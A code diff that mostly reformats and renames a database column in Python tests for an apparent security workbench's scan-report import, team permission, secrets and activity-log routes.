+                    "title": title,
+                    "severity": "medium",
+                    "evidence": evidence,
+                    "external_id": "unsafe-text-1",
+                }
+            )
 
             preview = client.post(
                 "/atlas/imports/preview",
@@ -2075,8 +2047,10 @@ SQL syntax error near q</response>
                 assert applied.status_code == 200
                 return applied.get_json()
 
-            with mock.patch.object(atlas_import_workflow.log, "debug") as remediation_debug, \
-                 mock.patch.object(atlas_import_workflow.log, "info") as remediation_info:
+            with (
+                mock.patch.object(atlas_import_workflow.log, "debug") as remediation_debug,
+                mock.patch.object(atlas_import_workflow.log, "info") as remediation_info,
+            ):
                 first_apply = preview_and_apply(
                     burp_payload("Use parameterized queries."),
                     "burp-remediation-first",
@@ -2182,9 +2156,11 @@ SQL syntax error near q</response>
             assert not isinstance(streamed_content, (bytes, str))
             assert hasattr(streamed_content, "read")
 
-            with mock.patch.dict(config.CFG, {"atlas_import_max_upload_mb": 1}, clear=False), \
-                    mock.patch("blueprints.atlas.preview_atlas_import") as mock_preview, \
-                    mock.patch("blueprints.atlas.log.warning") as mock_preview_warning:
+            with (
+                mock.patch.dict(config.CFG, {"atlas_import_max_upload_mb": 1}, clear=False),
+                mock.patch("blueprints.atlas.preview_atlas_import") as mock_preview,
+                mock.patch("blueprints.atlas.log.warning") as mock_preview_warning,
+            ):
                 declared_oversized = client.post(
                     "/atlas/imports/preview",
                     data={},
@@ -2225,8 +2201,7 @@ SQL syntax error near q</response>
             preview_rejected_extra = next(
                 call.kwargs["extra"]
                 for call in mock_import_warning.call_args_list
-                if call.args[0] == "ATLAS_IMPORT_PREVIEW_REJECTED"
-                and "session" in call.kwargs["extra"]
+                if call.args[0] == "ATLAS_IMPORT_PREVIEW_REJECTED" and "session" in call.kwargs["extra"]
             )
             assert preview_rejected_extra["reason"] == "invalid_import_file"
             assert preview_rejected_extra["session"].startswith("tok_atla")
@@ -2297,8 +2272,7 @@ SQL syntax error near q</response>
             service_stale_warning = next(
                 call.kwargs["extra"]
                 for call in mock_apply_warning.call_args_list
-                if call.args[0] == "ATLAS_IMPORT_APPLY_REJECTED"
-                and "draft_status" in call.kwargs["extra"]
+                if call.args[0] == "ATLAS_IMPORT_APPLY_REJECTED" and "draft_status" in call.kwargs["extra"]
             )
             assert service_stale_warning["draft_status"] == "previewed"
             assert service_stale_warning["required_capabilities"] == []
@@ -2321,8 +2295,7 @@ SQL syntax error near q</response>
             stale_applying_draft_id = stale_applying.get_json()["draft_id"]
             with db_connect() as conn:
                 conn.execute(
-                    "UPDATE atlas_import_drafts SET status = 'applying', expires_at = '2000-01-01 00:00:00' "
-                    "WHERE id = ?",
+                    "UPDATE atlas_import_drafts SET status = 'applying', expires_at = '2000-01-01 00:00:00' WHERE id = ?",
                     (stale_applying_draft_id,),
                 )
                 conn.commit()
@@ -2362,9 +2335,7 @@ SQL syntax error near q</response>
                 assert atlas_import_workflow.cleanup_expired_import_drafts(conn=conn, now="2026-01-01 00:00:00") == 1
                 conn.commit()
             cleanup_info = next(
-                call.kwargs["extra"]
-                for call in mock_cleanup_info.call_args_list
-                if call.args[0] == "ATLAS_IMPORT_DRAFTS_CLEANED"
+                call.kwargs["extra"] for call in mock_cleanup_info.call_args_list if call.args[0] == "ATLAS_IMPORT_DRAFTS_CLEANED"
             )
             assert cleanup_info["previewed_count"] == 1
 
@@ -2409,14 +2380,15 @@ SQL syntax error near q</response>
             service_digest_warning = next(
                 call.kwargs["extra"]
                 for call in mock_apply_warning.call_args_list
-                if call.args[0] == "ATLAS_IMPORT_APPLY_REJECTED"
-                and "draft_status" in call.kwargs["extra"]
+                if call.args[0] == "ATLAS_IMPORT_APPLY_REJECTED" and "draft_status" in call.kwargs["extra"]
             )
             assert service_digest_warning["draft_status"] == "previewed"
             assert service_digest_warning["option_import_entities"] is True
 
-            with mock.patch.dict(config.CFG, {"atlas_import_max_findings": 1}, clear=False), \
-                    mock.patch.object(atlas_import_workflow.log, "warning") as mock_limit_warning:
+            with (
+                mock.patch.dict(config.CFG, {"atlas_import_max_findings": 1}, clear=False),
+                mock.patch.object(atlas_import_workflow.log, "warning") as mock_limit_warning,
+            ):
                 too_many_findings = client.post(
                     "/atlas/imports/preview",
                     data={
@@ -2451,8 +2423,10 @@ SQL syntax error near q</response>
             invalid_limit_cfg = {
                 "atlas_import_preview_sample_limit": "nope",
             }
-            with mock.patch("services.atlas.import_limits.resolve_effective_cfg", return_value=invalid_limit_cfg), \
-                    mock.patch.object(atlas_import_workflow.log, "warning") as mock_config_warning:
+            with (
+                mock.patch("services.atlas.import_limits.resolve_effective_cfg", return_value=invalid_limit_cfg),
+                mock.patch.object(atlas_import_workflow.log, "warning") as mock_config_warning,
+            ):
                 invalid_config_preview = client.post(
                     "/atlas/imports/preview",
                     data={
@@ -2485,10 +2459,7 @@ SQL syntax error near q</response>
         try:
             session_id = "tok_atlas_import_compressed"
             self._register_session_token(session_id)
-            report = (
-                b"row_type,entity_kind,entity_value\n"
-                b"entity,domain,compressed-preview.darklab.sh\n"
-            )
+            report = b"row_type,entity_kind,entity_value\nentity,domain,compressed-preview.darklab.sh\n"
             uploaded = gzip.compress(report)
 
             preview = client.post(
@@ -2573,10 +2544,7 @@ class TestTeamRoutes:
             json={"code": invite.get_json()["invite"]["code"], "display_name": display_name},
         )
         assert joined.status_code in {200, 201}
-        return next(
-            member for member in joined.get_json()["members"]
-            if member["display_name"] == display_name
-        )
+        return next(member for member in joined.get_json()["members"] if member["display_name"] == display_name)
 
     def test_team_atlas_import_apply_requires_option_specific_capabilities(self, monkeypatch, tmp_path):
         from services.teams import capabilities
@@ -2601,21 +2569,27 @@ class TestTeamRoutes:
                 headers={"X-Session-ID": owner_token},
                 json={"role": "operator", "label": "Import triager"},
             )
-            assert client.post(
-                "/session/teams/join",
-                headers={"X-Session-ID": operator_token},
-                json={"code": operator_invite.get_json()["invite"]["code"], "display_name": "Import triager"},
-            ).status_code == 201
+            assert (
+                client.post(
+                    "/session/teams/join",
+                    headers={"X-Session-ID": operator_token},
+                    json={"code": operator_invite.get_json()["invite"]["code"], "display_name": "Import triager"},
+                ).status_code
+                == 201
+            )
             viewer_invite = client.post(
                 f"/session/teams/{team_id}/invites",
                 headers={"X-Session-ID": owner_token},
                 json={"role": "viewer", "label": "Import viewer"},
             )
-            assert client.post(
-                "/session/teams/join",
-                headers={"X-Session-ID": viewer_token},
-                json={"code": viewer_invite.get_json()["invite"]["code"], "display_name": "Import viewer"},
-            ).status_code == 201
+            assert (
+                client.post(
+                    "/session/teams/join",
+                    headers={"X-Session-ID": viewer_token},
+                    json={"code": viewer_invite.get_json()["invite"]["code"], "display_name": "Import viewer"},
+                ).status_code
+                == 201
+            )
 
             operator_headers = {"X-Session-ID": operator_token, "X-Team-ID": team_id}
             viewer_headers = {"X-Session-ID": viewer_token, "X-Team-ID": team_id}
@@ -2689,18 +2663,22 @@ class TestTeamRoutes:
                 assert conn.execute("SELECT COUNT(*) AS count FROM entities").fetchone()["count"] == 0
                 assert conn.execute("SELECT COUNT(*) AS count FROM findings").fetchone()["count"] == 0
 
-            cyclonedx_payload = json.dumps({
-                "bomFormat": "CycloneDX",
-                "specVersion": "1.5",
-                "metadata": {"timestamp": "2026-08-07T12:00:00Z"},
-                "components": [{
-                    "bom-ref": "pkg:pypi/example@1.0.0",
-                    "type": "library",
-                    "name": "example",
-                    "version": "1.0.0",
-                    "purl": "pkg:pypi/example@1.0.0",
-                }],
-            }).encode()
+            cyclonedx_payload = json.dumps(
+                {
+                    "bomFormat": "CycloneDX",
+                    "specVersion": "1.5",
+                    "metadata": {"timestamp": "2026-08-07T12:00:00Z"},
+                    "components": [
+                        {
+                            "bom-ref": "pkg:pypi/example@1.0.0",
+                            "type": "library",
+                            "name": "example",
+                            "version": "1.0.0",
+                            "purl": "pkg:pypi/example@1.0.0",
+                        }
+                    ],
+                }
+            ).encode()
             evidence_preview = client.post(
                 "/atlas/imports/preview",
                 data={
@@ -2785,12 +2763,11 @@ class TestTeamRoutes:
             with db_connect() as conn:
                 existing_entity_id = "ent_team_import_existing"
                 existing_value = "team-import-existing.example"
-                existing_signature = hashlib.sha256(
-                    f"domain\x1f{existing_value}".encode("utf-8", errors="replace")
-                ).hexdigest()
+                existing_signature = hashlib.sha256(f"domain\x1f{existing_value}".encode("utf-8", errors="replace")).hexdigest()
                 conn.execute(
                     "INSERT INTO entities "
-                    "(id, session_id, team_id, type, canonical_value, signature_hash, first_seen_at, last_seen_at, created) "
+                    "(id, personal_workspace_id, team_id, type, canonical_value, signature_hash, "
+                    "first_seen_at, last_seen_at, created) "
                     "VALUES (?, ?, ?, 'domain', ?, ?, ?, ?, ?)",
                     (
                         existing_entity_id,
@@ -2861,9 +2838,7 @@ class TestTeamRoutes:
             with db_connect() as conn:
                 assert conn.execute("SELECT COUNT(*) AS count FROM entities").fetchone()["count"] == 0
                 assert conn.execute("SELECT COUNT(*) AS count FROM findings").fetchone()["count"] == 1
-                finding_row = conn.execute(
-                    "SELECT team_id, subject_key, title FROM findings"
-                ).fetchone()
+                finding_row = conn.execute("SELECT team_id, subject_key, title FROM findings").fetchone()
             assert finding_row["team_id"] == team_id
             assert finding_row["subject_key"] == "external-subject-1"
             assert finding_row["title"] == "Subject-only finding"
@@ -2904,9 +2879,12 @@ class TestTeamRoutes:
             assert detail_payload["recovery_codes"][0]["used_at"] == ""
             assert "code_hash" not in detail.get_data(as_text=True)
 
-            with mock.patch.object(shell_app_module.log, "error") as mock_error, mock.patch(
-                "services.teams.storage.rotate_team_recovery_code",
-                side_effect=RuntimeError("recovery unavailable"),
+            with (
+                mock.patch.object(shell_app_module.log, "error") as mock_error,
+                mock.patch(
+                    "services.teams.storage.rotate_team_recovery_code",
+                    side_effect=RuntimeError("recovery unavailable"),
+                ),
             ):
                 failed = self._create_team(client, session_id, name="Rollback Operators")
             assert failed.status_code == 500
@@ -2923,8 +2901,7 @@ class TestTeamRoutes:
                     ("rollback-operators",),
                 ).fetchone()["count"]
                 member_count = conn.execute(
-                    "SELECT COUNT(*) AS count FROM team_members WHERE team_id IN "
-                    "(SELECT id FROM teams WHERE slug = ?)",
+                    "SELECT COUNT(*) AS count FROM team_members WHERE team_id IN (SELECT id FROM teams WHERE slug = ?)",
                     ("rollback-operators",),
                 ).fetchone()["count"]
             assert team_count == 0
@@ -2989,20 +2966,21 @@ class TestTeamRoutes:
                 json={"code": invite.get_json()["invite"]["code"], "display_name": "Secret operator"},
             )
             assert joined.status_code == 201
-            operator_member_id = next(
-                member["id"] for member in joined.get_json()["members"] if member["role"] == "operator"
-            )
+            operator_member_id = next(member["id"] for member in joined.get_json()["members"] if member["role"] == "operator")
 
             route_secret_events = []
             builtin_secret_events = []
-            with mock.patch.object(
-                secrets_routes,
-                "emit_secret_event",
-                side_effect=lambda event, session_id, **extra: route_secret_events.append((event, session_id, extra)),
-            ), mock.patch.object(
-                builtins_secrets,
-                "emit_secret_event",
-                side_effect=lambda event, session_id, **extra: builtin_secret_events.append((event, session_id, extra)),
+            with (
+                mock.patch.object(
+                    secrets_routes,
+                    "emit_secret_event",
+                    side_effect=lambda event, session_id, **extra: route_secret_events.append((event, session_id, extra)),
+                ),
+                mock.patch.object(
+                    builtins_secrets,
+                    "emit_secret_event",
+                    side_effect=lambda event, session_id, **extra: builtin_secret_events.append((event, session_id, extra)),
+                ),
             ):
                 personal_secret = client.post(
                     "/session/secrets",
@@ -3076,8 +3054,7 @@ class TestTeamRoutes:
                 assert "SHODAN_API_KEY was not set." in _builtin_lines_text(noop_lines)
 
             team_created_event = next(
-                event for event in route_secret_events
-                if event[0] == "SECRET_CREATED" and event[2].get("team_id") == team_id
+                event for event in route_secret_events if event[0] == "SECRET_CREATED" and event[2].get("team_id") == team_id
             )
             denied_event = next(event for event in route_secret_events if event[0] == "SECRET_ACTION_REJECTED")
             assert team_created_event[2]["actor_member_id"] == owner_member_id
@@ -3299,8 +3276,7 @@ class TestTeamRoutes:
                 conn.commit()
 
             owner = client.get(
-                f"/session/teams/{team_id}/activity?event_type=team.role_change"
-                "&date_from=2026-06-06&date_to=2026-06-06",
+                f"/session/teams/{team_id}/activity?event_type=team.role_change&date_from=2026-06-06&date_to=2026-06-06",
                 headers={"X-Session-ID": owner_token},
             )
             assert owner.status_code == 200
@@ -3314,8 +3290,7 @@ class TestTeamRoutes:
             assert "team_should_not_leak" not in event_json
 
             actor_filtered = client.get(
-                f"/session/teams/{team_id}/activity?actor=Activity%20Admin"
-                "&date_from=2026-06-06&date_to=2026-06-06",
+                f"/session/teams/{team_id}/activity?actor=Activity%20Admin&date_from=2026-06-06&date_to=2026-06-06",
                 headers={"X-Session-ID": owner_token},
             )
             assert actor_filtered.status_code == 200
@@ -3336,8 +3311,7 @@ class TestTeamRoutes:
             assert target_payload["events"][0]["target"]["type"] == "notification"
 
             first_page = client.get(
-                f"/session/teams/{team_id}/activity?event_type=team.role_change"
-                "&date_from=2026-06-06&date_to=2026-06-06&limit=1",
+                f"/session/teams/{team_id}/activity?event_type=team.role_change&date_from=2026-06-06&date_to=2026-06-06&limit=1",
                 headers={"X-Session-ID": owner_token},
             )
             assert first_page.status_code == 200
@@ -3412,9 +3386,7 @@ class TestTeamRoutes:
                 json={"code": invite.get_json()["invite"]["code"], "display_name": "Rollback operator"},
             )
             assert joined.status_code == 201
-            operator_member = next(
-                item for item in joined.get_json()["members"] if item["display_name"] == "Rollback operator"
-            )
+            operator_member = next(item for item in joined.get_json()["members"] if item["display_name"] == "Rollback operator")
 
             with mock.patch(
                 "blueprints.teams.record_event",
@@ -3430,9 +3402,7 @@ class TestTeamRoutes:
             assert promoted.get_json()["error"] == "team_route_failed"
             detail = client.get(f"/session/teams/{team_id}", headers={"X-Session-ID": owner_token})
             assert detail.status_code == 200
-            current_member = next(
-                item for item in detail.get_json()["members"] if item["id"] == operator_member["id"]
-            )
+            current_member = next(item for item in detail.get_json()["members"] if item["id"] == operator_member["id"])
             assert current_member["role"] == "operator"
             assert _audit_event_rows(target_id=team_id, event_type="team.role_change") == []
         finally:
@@ -3536,8 +3506,7 @@ class TestTeamRoutes:
             team_id = created.get_json()["team"]["id"]
             with db_connect() as conn:
                 before_rows = conn.execute(
-                    "SELECT id, rotated_at, revoked_at, used_at FROM team_recovery_codes "
-                    "WHERE team_id = ? ORDER BY created_at",
+                    "SELECT id, rotated_at, revoked_at, used_at FROM team_recovery_codes WHERE team_id = ? ORDER BY created_at",
                     (team_id,),
                 ).fetchall()
             assert len(before_rows) == 1
@@ -3557,8 +3526,7 @@ class TestTeamRoutes:
             assert rotated.get_json()["error"] == "team_route_failed"
             with db_connect() as conn:
                 after_rows = conn.execute(
-                    "SELECT id, rotated_at, revoked_at, used_at FROM team_recovery_codes "
-                    "WHERE team_id = ? ORDER BY created_at",
+                    "SELECT id, rotated_at, revoked_at, used_at FROM team_recovery_codes WHERE team_id = ? ORDER BY created_at",
                     (team_id,),
                 ).fetchall()
             assert len(after_rows) == 1
@@ -3659,6 +3627,7 @@ class TestTeamRoutes:
             assert recovery_join.get_json()["error"] == "team_archived"
             assert "archived" in recovery_join.get_json()["message"]
             from services.teams.storage import token_hash
+
             with db_connect() as conn:
                 invited_member = conn.execute(
                     "SELECT 1 FROM team_members WHERE team_id = ? AND session_token_hash = ?",
@@ -3715,7 +3684,7 @@ class TestTeamRoutes:
             with db_connect() as conn:
                 conn.execute(
                     "INSERT INTO runs "
-                    "(id, session_id, team_id, run_kind, command, started, finished, exit_code, "
+                    "(id, personal_workspace_id, team_id, run_kind, command, started, finished, exit_code, "
                     "output_preview, output_line_count, output_search_text) "
                     "VALUES (?, ?, '', 'external', 'echo personal', ?, ?, 0, ?, 1, 'personal output')",
                     (
@@ -3728,7 +3697,7 @@ class TestTeamRoutes:
                 )
                 conn.execute(
                     "INSERT INTO runs "
-                    "(id, session_id, team_id, run_kind, command, started, finished, exit_code, "
+                    "(id, personal_workspace_id, team_id, run_kind, command, started, finished, exit_code, "
                     "output_preview, output_line_count, output_search_text) "
                     "VALUES (?, ?, ?, 'external', 'echo team', ?, ?, 0, ?, 1, 'team output')",
                     (
@@ -3831,11 +3800,14 @@ class TestTeamRoutes:
                 headers={"X-Session-ID": owner_token},
                 json={"role": "viewer", "label": "History viewer"},
             )
-            assert client.post(
-                "/session/teams/join",
-                headers={"X-Session-ID": viewer_token},
-                json={"code": viewer_invite.get_json()["invite"]["code"], "display_name": "Viewer"},
-            ).status_code == 201
+            assert (
+                client.post(
+                    "/session/teams/join",
+                    headers={"X-Session-ID": viewer_token},
+                    json={"code": viewer_invite.get_json()["invite"]["code"], "display_name": "Viewer"},
+                ).status_code
+                == 201
+            )
             personal_bulk_id = "run-team-history-personal-bulk"
             personal_clear_id = "run-team-history-personal-clear"
             team_bulk_id = "run-team-history-team-bulk"
@@ -3851,7 +3823,7 @@ class TestTeamRoutes:
                 for run_id, session_id, run_team_id, command in rows:
                     conn.execute(
                         "INSERT INTO runs "
-                        "(id, session_id, team_id, run_kind, command, started, finished, exit_code, "
+                        "(id, personal_workspace_id, team_id, run_kind, command, started, finished, exit_code, "
                         "output_preview, output_line_count) "
                         "VALUES (?, ?, ?, 'external', ?, ?, ?, 0, ?, 1)",
                         (
@@ -3963,16 +3935,22 @@ class TestTeamRoutes:
                 headers={"X-Session-ID": owner_token},
                 json={"role": "viewer", "label": "Capability viewer"},
             )
-            assert client.post(
-                "/session/teams/join",
-                headers={"X-Session-ID": operator_token},
-                json={"code": operator_invite.get_json()["invite"]["code"], "display_name": "Operator"},
-            ).status_code == 201
-            assert client.post(
-                "/session/teams/join",
-                headers={"X-Session-ID": viewer_token},
-                json={"code": viewer_invite.get_json()["invite"]["code"], "display_name": "Viewer"},
-            ).status_code == 201
+            assert (
+                client.post(
+                    "/session/teams/join",
+                    headers={"X-Session-ID": operator_token},
+                    json={"code": operator_invite.get_json()["invite"]["code"], "display_name": "Operator"},
+                ).status_code
+                == 201
+            )
+            assert (
+                client.post(
+                    "/session/teams/join",
+                    headers={"X-Session-ID": viewer_token},
+                    json={"code": viewer_invite.get_json()["invite"]["code"], "display_name": "Viewer"},
+                ).status_code
+                == 201
+            )
 
             owner_headers = {"X-Session-ID": owner_token, "X-Team-ID": team_id}
             operator_headers = {"X-Session-ID": operator_token, "X-Team-ID": team_id}
@@ -3989,14 +3967,14 @@ class TestTeamRoutes:
             with db_connect() as conn:
                 conn.execute(
                     "INSERT INTO runs "
-                    "(id, session_id, team_id, run_kind, command, started, finished, exit_code, "
+                    "(id, personal_workspace_id, team_id, run_kind, command, started, finished, exit_code, "
                     "output_preview, output_line_count, output_search_text) "
                     "VALUES (?, ?, ?, 'external', 'httpx capability.example', ?, ?, 0, '[]', 0, '')",
                     (run_id, owner_token, team_id, seen_at, seen_at),
                 )
                 conn.execute(
                     "INSERT INTO entities "
-                    "(id, session_id, type, canonical_value, signature_hash, first_seen_at, last_seen_at, created) "
+                    "(id, personal_workspace_id, type, canonical_value, signature_hash, first_seen_at, last_seen_at, created) "
                     "VALUES (?, ?, 'domain', 'capability.example', ?, ?, ?, ?)",
                     (entity_id, owner_token, "sig_" + entity_id, seen_at, seen_at, seen_at),
                 )
@@ -4008,7 +3986,7 @@ class TestTeamRoutes:
                 )
                 conn.execute(
                     "INSERT INTO findings "
-                    "(id, session_id, run_id, entity_id, subject_key, signature_hash, severity, kind, tool_root, "
+                    "(id, personal_workspace_id, run_id, entity_id, subject_key, signature_hash, severity, kind, tool_root, "
                     "first_run_id, last_run_id, first_seen_at, last_seen_at, occurrence_count, status, title, raw_line, created) "
                     "VALUES (?, ?, ?, ?, ?, ?, 'medium', 'finding', 'httpx', ?, ?, ?, ?, 1, 'new', ?, ?, ?)",
                     (
@@ -4034,7 +4012,7 @@ class TestTeamRoutes:
                 )
                 conn.execute(
                     "INSERT INTO entities "
-                    "(id, session_id, type, canonical_value, signature_hash, first_seen_at, "
+                    "(id, personal_workspace_id, type, canonical_value, signature_hash, first_seen_at, "
                     "last_seen_at, created) VALUES (?, ?, 'domain', 'capability-merge.example', "
                     "?, ?, ?, ?)",
                     (
@@ -4048,7 +4026,7 @@ class TestTeamRoutes:
                 )
                 conn.execute(
                     "INSERT INTO findings "
-                    "(id, session_id, run_id, entity_id, subject_key, signature_hash, severity, "
+                    "(id, personal_workspace_id, run_id, entity_id, subject_key, signature_hash, severity, "
                     "kind, tool_root, first_run_id, last_run_id, first_seen_at, last_seen_at, "
                     "occurrence_count, status, title, raw_line, created) "
                     "VALUES (?, ?, ?, ?, ?, ?, 'medium', 'finding', 'httpx', ?, ?, ?, ?, 1, "
@@ -4213,9 +4191,7 @@ class TestTeamRoutes:
             assert viewer_active_get.status_code == 200
             assert viewer_active_get.get_json()["project"]["id"] == project_id
             assert viewer_personal_switcher.status_code == 200
-            assert project_id not in {
-                project["id"] for project in viewer_personal_switcher.get_json()["projects"]
-            }
+            assert project_id not in {project["id"] for project in viewer_personal_switcher.get_json()["projects"]}
             assert viewer_active_clear.status_code == 200
             assert viewer_active_clear.get_json()["cleared"] is True
             assert operator_target_create.status_code == 201
@@ -4226,22 +4202,15 @@ class TestTeamRoutes:
             assert viewer_finding_triage_read.status_code == 200
             assert operator_finding_triage_update.status_code == 200
             assert viewer_finding_triage_after_update.status_code == 200
-            assert viewer_finding_triage_after_update.get_json()["triage"]["remediation"] == (
-                "Patch capability finding."
-            )
-            verification_disposition = viewer_finding_triage_after_update.get_json()["triage"][
-                "verification_disposition"
-            ]
+            assert viewer_finding_triage_after_update.get_json()["triage"]["remediation"] == ("Patch capability finding.")
+            verification_disposition = viewer_finding_triage_after_update.get_json()["triage"]["verification_disposition"]
             assert verification_disposition["status"] == "verified"
             assert verification_disposition["actor"]["kind"] == "team_member"
             assert verification_disposition["actor"]["display_name"] == "Operator"
             assert operator_token not in json.dumps(verification_disposition)
             assert viewer_finding_triage_update.status_code == 403
             assert viewer_merge_candidates.status_code == 200
-            assert [
-                item["finding_id"]
-                for item in viewer_merge_candidates.get_json()["candidates"]
-            ] == [merge_finding_id]
+            assert [item["finding_id"] for item in viewer_merge_candidates.get_json()["candidates"]] == [merge_finding_id]
             assert viewer_merge_preview.status_code == 200
             assert viewer_merge_apply.status_code == 403
             assert operator_merge_apply.status_code == 200
@@ -4267,11 +4236,14 @@ class TestTeamRoutes:
                 headers={"X-Session-ID": owner_token},
                 json={"role": "viewer", "label": "Auto-promote viewer"},
             )
-            assert client.post(
-                "/session/teams/join",
-                headers={"X-Session-ID": viewer_token},
-                json={"code": viewer_invite.get_json()["invite"]["code"], "display_name": "Viewer"},
-            ).status_code == 201
+            assert (
+                client.post(
+                    "/session/teams/join",
+                    headers={"X-Session-ID": viewer_token},
+                    json={"code": viewer_invite.get_json()["invite"]["code"], "display_name": "Viewer"},
+                ).status_code
+                == 201
+            )
             owner_headers = {"X-Session-ID": owner_token, "X-Team-ID": team_id}
             viewer_headers = {"X-Session-ID": viewer_token, "X-Team-ID": team_id}
             project_created = client.post("/projects", headers=owner_headers, json={"name": "Auto Promote"})
@@ -4280,7 +4252,7 @@ class TestTeamRoutes:
             with db_connect() as conn:
                 conn.execute(
                     "INSERT INTO entities "
-                    "(id, session_id, team_id, type, canonical_value, signature_hash, "
+                    "(id, personal_workspace_id, team_id, type, canonical_value, signature_hash, "
                     "first_seen_at, last_seen_at, created) "
                     "VALUES ('ent_team_auto_promote', ?, ?, 'domain', 'team-auto.example', "
                     "'sig_ent_team_auto_promote', ?, ?, ?)",
@@ -4362,16 +4334,22 @@ class TestTeamRoutes:
                 headers={"X-Session-ID": owner_token},
                 json={"role": "operator", "label": "Workflow operator"},
             )
-            assert client.post(
-                "/session/teams/join",
-                headers={"X-Session-ID": admin_token},
-                json={"code": admin_invite.get_json()["invite"]["code"], "display_name": "Workflow admin"},
-            ).status_code == 201
-            assert client.post(
-                "/session/teams/join",
-                headers={"X-Session-ID": operator_token},
-                json={"code": operator_invite.get_json()["invite"]["code"], "display_name": "Workflow operator"},
-            ).status_code == 201
+            assert (
+                client.post(
+                    "/session/teams/join",
+                    headers={"X-Session-ID": admin_token},
+                    json={"code": admin_invite.get_json()["invite"]["code"], "display_name": "Workflow admin"},
+                ).status_code
+                == 201
+            )
+            assert (
+                client.post(
+                    "/session/teams/join",
+                    headers={"X-Session-ID": operator_token},
+                    json={"code": operator_invite.get_json()["invite"]["code"], "display_name": "Workflow operator"},
+                ).status_code
+                == 201
+            )
 
             payload = {
                 "title": "Team DNS",
@@ -4517,7 +4495,7 @@ class TestTeamRoutes:
             with db_connect() as conn:
                 conn.execute(
                     "INSERT INTO runs "
-                    "(id, session_id, team_id, run_kind, command, started, finished, exit_code, "
+                    "(id, personal_workspace_id, team_id, run_kind, command, started, finished, exit_code, "
                     "output_preview, output_line_count, output_search_text) "
                     "VALUES (?, ?, '', 'external', 'nmap personal.example', ?, ?, 0, ?, 1, 'personal output')",
                     (
@@ -4530,7 +4508,7 @@ class TestTeamRoutes:
                 )
                 conn.execute(
                     "INSERT INTO runs "
-                    "(id, session_id, team_id, run_kind, command, started, finished, exit_code, "
+                    "(id, personal_workspace_id, team_id, run_kind, command, started, finished, exit_code, "
                     "output_preview, output_line_count, output_search_text) "
                     "VALUES (?, ?, ?, 'external', 'nmap team.example', ?, ?, 0, ?, 1, 'team output')",
                     (
@@ -4574,9 +4552,7 @@ class TestTeamRoutes:
             assert team_runs.status_code == 200
             assert [item["id"] for item in team_runs.get_json()["runs"]] == [team_run_id]
             assert team_projects_with_counts.status_code == 200
-            counted_project = next(
-                item for item in team_projects_with_counts.get_json()["projects"] if item["id"] == project_id
-            )
+            counted_project = next(item for item in team_projects_with_counts.get_json()["projects"] if item["id"] == project_id)
             assert counted_project["counts"]["runs"] == 1
             assert personal_project_detail.status_code == 404
 
@@ -4749,17 +4725,19 @@ class TestTeamRoutes:
             fake_proc = _RouteFakeProc(pid=8790)
 
             patched_cfg = build_test_config(workspace_cfg)
-            with mock.patch("config.CFG", patched_cfg), \
-                 mock.patch("blueprints.run.CFG", patched_cfg), \
-                 mock.patch("services.commands.registry.load_commands_registry", return_value=registry), \
-                 mock.patch("blueprints.run.broker_available", return_value=True), \
-                 mock.patch("blueprints.run.runtime_missing_command_name", return_value=None), \
-                 mock.patch("blueprints.run.subprocess.Popen", return_value=fake_proc) as popen, \
-                 mock.patch("blueprints.run.pid_register"), \
-                 mock.patch("blueprints.run.active_run_register") as active_register, \
-                 mock.patch("blueprints.run.publish_run_event"), \
-                 mock.patch("services.runs.start.threading", mock.Mock(Thread=_CapturedThread)), \
-                 mock.patch("blueprints.run.uuid.uuid4", return_value="run-team-workspace"):
+            with (
+                mock.patch("config.CFG", patched_cfg),
+                mock.patch("blueprints.run.CFG", patched_cfg),
+                mock.patch("services.commands.registry.load_commands_registry", return_value=registry),
+                mock.patch("blueprints.run.broker_available", return_value=True),
+                mock.patch("blueprints.run.runtime_missing_command_name", return_value=None),
+                mock.patch("blueprints.run.subprocess.Popen", return_value=fake_proc) as popen,
+                mock.patch("blueprints.run.pid_register"),
+                mock.patch("blueprints.run.active_run_register") as active_register,
+                mock.patch("blueprints.run.publish_run_event"),
+                mock.patch("services.runs.start.threading", mock.Mock(Thread=_CapturedThread)),
+                mock.patch("blueprints.run.uuid.uuid4", return_value="run-team-workspace"),
+            ):
                 resp = client.post(
                     "/runs",
                     json={"command": "nmap -iL targets.txt -oN scan.txt", "tab_id": "tab-team"},
@@ -4814,14 +4792,14 @@ class TestTeamRoutes:
             with db_connect() as conn:
                 conn.execute(
                     "INSERT INTO runs "
-                    "(id, session_id, team_id, run_kind, command, started, finished, exit_code, "
+                    "(id, personal_workspace_id, team_id, run_kind, command, started, finished, exit_code, "
                     "output_preview, output_line_count, output_search_text) "
                     "VALUES (?, ?, ?, 'external', 'httpx cross-member.example', ?, ?, 0, '[]', 0, '')",
                     (run_id, owner_token, team_id, seen_at, seen_at),
                 )
                 conn.execute(
                     "INSERT INTO entities "
-                    "(id, session_id, type, canonical_value, signature_hash, first_seen_at, last_seen_at, created) "
+                    "(id, personal_workspace_id, type, canonical_value, signature_hash, first_seen_at, last_seen_at, created) "
                     "VALUES (?, ?, 'domain', 'cross-member.example', ?, ?, ?, ?)",
                     (entity_id, owner_token, "sig_" + entity_id, seen_at, seen_at, seen_at),
                 )
@@ -4833,7 +4811,8 @@ class TestTeamRoutes:
                 )
                 conn.execute(
                     "INSERT INTO findings "
-                    "(id, session_id, team_id, run_id, entity_id, subject_key, signature_hash, severity, kind, tool_root, "
+                    "(id, personal_workspace_id, team_id, run_id, entity_id, subject_key, "
+                    "signature_hash, severity, kind, tool_root, "
                     "first_run_id, last_run_id, first_seen_at, last_seen_at, occurrence_count, status, title, "
                     "raw_line, created) "
                     "VALUES (?, ?, ?, ?, ?, ?, ?, 'high', 'finding', 'httpx', ?, ?, ?, ?, 1, 'new', ?, ?, ?)",
@@ -4952,6 +4931,7 @@ class TestTeamRoutes:
             )
             assert joined.status_code == 201
             from services.teams.storage import token_hash
+
             with db_connect() as conn:
                 operator_member = conn.execute(
                     "SELECT id FROM team_members WHERE team_id = ? AND session_token_hash = ?",
@@ -4990,7 +4970,7 @@ class TestTeamRoutes:
             with db_connect() as conn:
                 conn.execute(
                     "INSERT INTO runs "
-                    "(id, session_id, team_id, run_kind, command, started, finished, exit_code, "
+                    "(id, personal_workspace_id, team_id, run_kind, command, started, finished, exit_code, "
                     "output_preview, output_line_count, output_search_text) "
                     "VALUES (?, ?, ?, 'external', 'cat reports/team-artifact.txt', ?, ?, 0, ?, 1, ?)",
                     (
@@ -5010,7 +4990,7 @@ class TestTeamRoutes:
                 )
                 conn.execute(
                     "INSERT INTO run_file_artifacts "
-                    "(id, session_id, run_id, workspace_path, display_name, kind, byte_size, detected_by, "
